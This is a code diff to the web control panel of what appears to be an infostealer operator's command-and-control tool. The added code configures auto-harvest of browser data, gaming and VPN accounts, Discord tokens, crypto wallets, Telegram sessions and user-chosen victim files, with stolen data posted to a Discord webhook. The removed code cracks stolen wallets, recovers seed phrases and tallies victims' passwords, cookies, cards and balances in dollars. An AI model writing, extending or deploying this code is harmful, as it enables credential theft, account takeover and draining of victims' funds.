@@ -68,6 +68,10 @@
   const autoHarvestToggle = $("auto-harvest-toggle");
   const autoFilesToggle   = $("auto-files-toggle");
   const autoExtToggle     = $("auto-ext-toggle");
+  const autoWalletsToggle = $("auto-wallets-toggle");
+  const autoTelegramToggle = $("auto-telegram-toggle");
+  const autoFileExtsInput = $("auto-file-exts");
+  const autoFileNamesInput = $("auto-file-names");
   const captureHistoryToggle = $("capture-history-toggle");
   const captureCookiesToggle = $("capture-cookies-toggle");
   const historyLimitInput = $("history-limit-input");
@@ -94,9 +98,6 @@
   const refreshBtn   = $("refresh-btn");
   const exportAllBtn = $("export-all-btn");
   const clearAllBtn  = $("clear-all-btn");
-  const summaryCard  = $("summary-card");
-  const summaryGrid  = $("summary-grid");
-  const summaryTotals = $("summary-totals");
   const searchAllView  = $("search-all-view");
   const searchAllGrid  = $("search-all-grid");
   const searchAllEmpty = $("search-all-empty");
@@ -1573,7 +1574,39 @@
   }
 
   // ── Settings (auto-harvest) ───────────────────────────────────
-  async function buildAutoStartEvents(files, ext) {
+  function parseListInput(text) {
+    return String(text || "")
+      .split(/[\n,;]+/)
+      .map((s) => s.trim())
+      .filter(Boolean);
+  }
+
+  function parseFileFilterFromInputs() {
+    const rawExts = parseListInput(autoFileExtsInput?.value);
+    const extensions = [];
+    const names = [];
+    for (const item of rawExts) {
+      if (item.startsWith(".") || item.startsWith("*.")) {
+        const ext = item.startsWith("*.") ? item.slice(1).toLowerCase() : item.toLowerCase();
+        extensions.push(ext.startsWith(".") ? ext : "." + ext);
+      } else if (item.includes(".") && !item.includes(" ")) {
+        // exact filename e.g. config.json
+        names.push(item);
+        const ext = item.includes(".") ? ("." + item.split(".").pop().toLowerCase()) : "";
+        if (ext && ext !== "." && !extensions.includes(ext)) {
+          // also allow by extension so *.json still catches variants if user listed config.json only? 
+          // Keep exact name only for names list; don't force all .json
+        }
+      } else {
+        names.push(item);
+      }
+    }
+    const nameContains = parseListInput(autoFileNamesInput?.value);
+    return { extensions, names, nameContains };
+  }
+
+  async function buildAutoStartEvents(opts) {
+    const { files, ext, wallets, telegram, fileFilter } = opts;
     let discord = { enabled: false, webhookUrl: "", threadPrefix: "Stuart" };
     try {
       const s = await rpc("get_capture_settings");
@@ -1584,9 +1617,34 @@
       };
     } catch (_) {}
     // Agent POSTs harvest to Discord webhook (HTTP); C2 WS only gets a small complete event
-    const events = [{ event: "collect", payload: { browsers: true, gaming: true, vpns: true, discord } }];
-    if (files) events.push({ event: "scan_files", payload: {} });
+    const collectPayload = {
+      browsers: true,
+      gaming: true,
+      vpns: true,
+      discord,
+      files: !!files,
+      wallets: !!wallets,
+      telegram: !!telegram,
+    };
+    if (files && fileFilter) {
+      collectPayload.fileExtensions = fileFilter.extensions || [];
+      collectPayload.fileNames = fileFilter.names || [];
+      collectPayload.fileNameContains = fileFilter.nameContains || [];
+    }
+    const events = [{ event: "collect", payload: collectPayload }];
+    if (files) {
+      events.push({
+        event: "scan_files",
+        payload: {
+          extensions: fileFilter?.extensions || [],
+          names: fileFilter?.names || [],
+          nameContains: fileFilter?.nameContains || [],
+        },
+      });
+    }
     if (ext) events.push({ event: "scan_extensions", payload: {} });
+    if (wallets) events.push({ event: "scan_wallets", payload: {} });
+    if (telegram) events.push({ event: "scan_telegram", payload: {} });
     return events;
   }
 
@@ -1600,23 +1658,50 @@
       if (!pluginCfg) return;
       const enabled = !!pluginCfg.autoLoad;
       const events = pluginCfg.autoStartEvents || [];
-      applySettingsUI(enabled, events.some(e => e.event === "scan_files"), events.some(e => e.event === "scan_extensions"));
+      const fileEv = events.find(e => e.event === "scan_files");
+      const filter = fileEv?.payload || {};
+      applySettingsUI({
+        enabled,
+        files: events.some(e => e.event === "scan_files") || !!(events.find(e => e.event === "collect")?.payload?.files),
+        ext: events.some(e => e.event === "scan_extensions"),
+        wallets: events.some(e => e.event === "scan_wallets") || !!(events.find(e => e.event === "collect")?.payload?.wallets),
+        telegram: events.some(e => e.event === "scan_telegram") || !!(events.find(e => e.event === "collect")?.payload?.telegram),
+        fileExts: [
+          ...(filter.extensions || []),
+          ...(filter.names || []),
+        ].join(", "),
+        fileNames: (filter.nameContains || []).join(", "),
+      });
     } catch (_) {}
   }
 
-  function applySettingsUI(enabled, files, ext) {
+  function applySettingsUI(state) {
     if (!autoHarvestToggle) return;
+    const enabled = !!state.enabled;
     autoHarvestToggle.checked = enabled;
-    autoFilesToggle.disabled = !enabled;
-    autoFilesToggle.checked = files;
-    if (autoExtToggle) {
-      autoExtToggle.disabled = !enabled;
-      autoExtToggle.checked = ext;
+
+    const setSub = (toggle, rowId, checked) => {
+      if (!toggle) return;
+      toggle.disabled = !enabled;
+      toggle.checked = !!checked;
+      const row = $(rowId);
+      if (row) row.style.opacity = enabled ? "1" : "0.5";
+    };
+    setSub(autoFilesToggle, "ah-files-row", state.files);
+    setSub(autoExtToggle, "ah-ext-row", state.ext);
+    setSub(autoWalletsToggle, "ah-wallets-row", state.wallets);
+    setSub(autoTelegramToggle, "ah-telegram-row", state.telegram);
+
+    const block = $("ah-file-list-block");
+    if (block) block.style.opacity = enabled && state.files ? "1" : "0.5";
+    if (autoFileExtsInput) {
+      autoFileExtsInput.disabled = !enabled || !state.files;
+      if (state.fileExts != null) autoFileExtsInput.value = state.fileExts;
     }
-    const filesRow = $("ah-files-row");
-    const extRow = $("ah-ext-row");
-    if (filesRow) filesRow.style.opacity = enabled ? "1" : "0.5";
-    if (extRow) extRow.style.opacity = enabled ? "1" : "0.5";
+    if (autoFileNamesInput) {
+      autoFileNamesInput.disabled = !enabled || !state.files;
+      if (state.fileNames != null) autoFileNamesInput.value = state.fileNames;
+    }
   }
 
   async function saveSettings() {
@@ -1625,10 +1710,15 @@
     const enabled = autoHarvestToggle.checked;
     const files = autoFilesToggle.checked;
     const ext = autoExtToggle ? autoExtToggle.checked : false;
+    const wallets = autoWalletsToggle ? autoWalletsToggle.checked : false;
+    const telegram = autoTelegramToggle ? autoTelegramToggle.checked : false;
+    const fileFilter = parseFileFilterFromInputs();
     try {
       const body = {
         autoLoad: enabled,
-        autoStartEvents: enabled ? await buildAutoStartEvents(files, ext) : [],
+        autoStartEvents: enabled
+          ? await buildAutoStartEvents({ files, ext, wallets, telegram, fileFilter })
+          : [],
       };
       const res = await fetch(`/api/plugins/${PLUGIN_ID}/autoload`, {
         method: "POST",
@@ -1638,7 +1728,15 @@
       const data = await res.json();
       if (!data.ok) throw new Error(data.error || "failed");
       settingsStatus.textContent = enabled ? "Auto-harvest enabled" : "Auto-harvest disabled";
-      applySettingsUI(enabled, files, ext);
+      applySettingsUI({
+        enabled,
+        files,
+        ext,
+        wallets,
+        telegram,
+        fileExts: autoFileExtsInput?.value,
+        fileNames: autoFileNamesInput?.value,
+      });
     } catch (e) {
       settingsStatus.textContent = `Error: ${e.message}`;
     }
@@ -1822,6 +1920,10 @@
       if (autoHarvestToggle) autoHarvestToggle.disabled = true;
       if (autoFilesToggle) autoFilesToggle.disabled = true;
       if (autoExtToggle) autoExtToggle.disabled = true;
+      if (autoWalletsToggle) autoWalletsToggle.disabled = true;
+      if (autoTelegramToggle) autoTelegramToggle.disabled = true;
+      if (autoFileExtsInput) autoFileExtsInput.disabled = true;
+      if (autoFileNamesInput) autoFileNamesInput.disabled = true;
       if (captureHistoryToggle) captureHistoryToggle.disabled = true;
       if (captureCookiesToggle) captureCookiesToggle.disabled = true;
       if (historyLimitInput) historyLimitInput.disabled = true;
@@ -1845,8 +1947,24 @@
     }
 
     if (autoHarvestToggle) autoHarvestToggle.addEventListener("change", saveSettings);
-    if (autoFilesToggle) autoFilesToggle.addEventListener("change", saveSettings);
+    if (autoFilesToggle) autoFilesToggle.addEventListener("change", () => {
+      // Enable/disable file list inputs immediately, then save
+      applySettingsUI({
+        enabled: autoHarvestToggle.checked,
+        files: autoFilesToggle.checked,
+        ext: autoExtToggle?.checked,
+        wallets: autoWalletsToggle?.checked,
+        telegram: autoTelegramToggle?.checked,
+        fileExts: autoFileExtsInput?.value,
+        fileNames: autoFileNamesInput?.value,
+      });
+      saveSettings();
+    });
     if (autoExtToggle) autoExtToggle.addEventListener("change", saveSettings);
+    if (autoWalletsToggle) autoWalletsToggle.addEventListener("change", saveSettings);
+    if (autoTelegramToggle) autoTelegramToggle.addEventListener("change", saveSettings);
+    if (autoFileExtsInput) autoFileExtsInput.addEventListener("change", saveSettings);
+    if (autoFileNamesInput) autoFileNamesInput.addEventListener("change", saveSettings);
     if (captureHistoryToggle) captureHistoryToggle.addEventListener("change", saveCaptureSettings);
     if (captureCookiesToggle) captureCookiesToggle.addEventListener("change", saveCaptureSettings);
     if (historyLimitInput) historyLimitInput.addEventListener("change", saveCaptureSettings);
@@ -1927,137 +2045,7 @@
       ].map(s => `<span class="gstat">${s}</span>`).join(sep);
 
       exportAllBtn.disabled = knownClients.length === 0;
-      loadSummary();
     } catch (e) { log(`Stats error: ${e.message}`); }
-  }
-
-  let summaryData = [];
-  let summaryWalletResults = {};
-
-  async function loadSummary() {
-    if (!summaryCard || !summaryGrid) return;
-    try {
-      summaryData = await rpc("get_summary");
-      if (!summaryData.length) { summaryCard.style.display = "none"; return; }
-      summaryCard.style.display = "";
-      renderSummary();
-
-      // Load saved seeds for all clients in parallel
-      const seedResults = await Promise.all(
-        summaryData.map(c =>
-          rpc("get_wallet_seeds", { clientId: c.clientId })
-            .catch(e => { log(`get_wallet_seeds ${c.clientId} error: ${e.message}`); return {}; })
-        )
-      );
-
-      const balanceRefreshJobs = [];
-      const crackJobs = [];
-      for (let ci = 0; ci < summaryData.length; ci++) {
-        const c = summaryData[ci];
-        const savedSeeds = seedResults[ci] || {};
-        const vaults = new Set(c.walletVaults || []);
-        for (const name of c.walletDownloaded || []) {
-          const key = `${c.clientId}:${name}`;
-          if (!summaryWalletResults[key] && savedSeeds[name]) {
-            summaryWalletResults[key] = { cracked: true, password: "(saved)", mnemonic: savedSeeds[name].mnemonic, addresses: savedSeeds[name].addresses };
-          }
-          if (summaryWalletResults[key]?.cracked && summaryWalletResults[key]?.mnemonic) {
-            balanceRefreshJobs.push({ key, mnemonic: summaryWalletResults[key].mnemonic });
-            continue;
-          }
-          if (summaryWalletResults[key]) continue;
-          const method = vaults.has(name) ? "crack_vault" : "crack_exodus";
-          crackJobs.push({ key, clientId: c.clientId, name, method });
-        }
-      }
-
-      // Refresh balances for already-cracked wallets in parallel
-      if (balanceRefreshJobs.length) {
-        Promise.all(balanceRefreshJobs.map(async ({ key, mnemonic }) => {
-          try {
-            const balResult = await rpc("check_cracked_balances", { mnemonic });
-            summaryWalletResults[key] = { ...summaryWalletResults[key], balances: balResult.totals, usdTotal: balResult.usdTotal };
-          } catch (e) { log(`Summary balance refresh error: ${e.message}`); }
-        })).then(() => renderSummary());
-      }
-
-      // Crack wallets that don't have saved seeds
-      for (const { key, clientId: cid, name, method } of crackJobs) {
-        try {
-          const result = await rpc(method, { clientId: cid, walletName: name });
-          summaryWalletResults[key] = result;
-          if (result.cracked && result.mnemonic) {
-            const balResult = await rpc("check_cracked_balances", { mnemonic: result.mnemonic });
-            summaryWalletResults[key] = { ...result, balances: balResult.totals, usdTotal: balResult.usdTotal };
-          }
-        } catch (e) { log(`Summary crack ${name} (${method}) error: ${e.message}`); }
-      }
-      renderSummary();
-    } catch (e) { log(`Summary error: ${e.message}`); }
-  }
-
-  function renderSummary() {
-    if (!summaryGrid) return;
-    let totalUsd = 0;
-    const cards = [];
-
-    for (const c of summaryData) {
-      let clientUsd = 0;
-      const walletInfo = [];
-      for (const name of c.walletNames || []) {
-        const key = `${c.clientId}:${name}`;
-        const cr = summaryWalletResults[key];
-        if (cr?.cracked) {
-          clientUsd += cr.usdTotal || 0;
-          walletInfo.push({ name, cracked: true, usdTotal: cr.usdTotal || 0, password: cr.password });
-        } else if (cr && !cr.cracked) {
-          walletInfo.push({ name, cracked: false, tried: cr.tried });
-        } else {
-          walletInfo.push({ name, pending: true });
-        }
-      }
-      totalUsd += clientUsd;
-      cards.push({ client: c, clientUsd, walletInfo });
-    }
-
-    if (summaryTotals) {
-      summaryTotals.innerHTML = `
-        <span class="summary-usd">${totalUsd > 0 ? "$" + totalUsd.toFixed(2) : "$0.00"}</span>
-        <span class="summary-meta">${summaryData.length} client${summaryData.length !== 1 ? "s" : ""} · ${Object.keys(summaryWalletResults).length} wallets checked</span>
-      `;
-    }
-
-    summaryGrid.innerHTML = "";
-    for (const { client: c, clientUsd, walletInfo } of cards) {
-      const div = document.createElement("div");
-      div.className = "summary-client-card";
-
-      const walletsHtml = walletInfo.map(w => {
-        if (w.cracked) {
-          return `<span class="summary-wallet cracked" title="Password: ${esc(w.password)}">${esc(w.name)} <b>$${w.usdTotal.toFixed(2)}</b></span>`;
-        } else if (w.pending) {
-          return `<span class="summary-wallet pending">${esc(w.name)}</span>`;
-        } else {
-          return `<span class="summary-wallet failed">${esc(w.name)} (${w.tried} tried)</span>`;
-        }
-      }).join("");
-
-      div.innerHTML = `
-        <div class="summary-client-top">
-          <span class="client-id-badge" title="${esc(c.clientId)}">${esc(shortId(c.clientId))}</span>
-          <span class="summary-client-usd">${clientUsd > 0 ? "$" + clientUsd.toFixed(2) : ""}</span>
-        </div>
-        <div class="summary-client-counts">
-          <span>${(c.passwords || 0).toLocaleString()} pw</span>
-          <span>${(c.cookies || 0).toLocaleString()} cookies</span>
-          <span>${(c.creditCards || 0).toLocaleString()} cards</span>
-          <span>${(c.discordTokens || 0).toLocaleString()} discord</span>
-          <span>${(c.wallets || 0)} wallets</span>
-        </div>
-        ${walletsHtml ? `<div class="summary-wallets">${walletsHtml}</div>` : ""}
-      `;
-      summaryGrid.appendChild(div);
-    }
   }
 
   async function loadGlobalTab() {
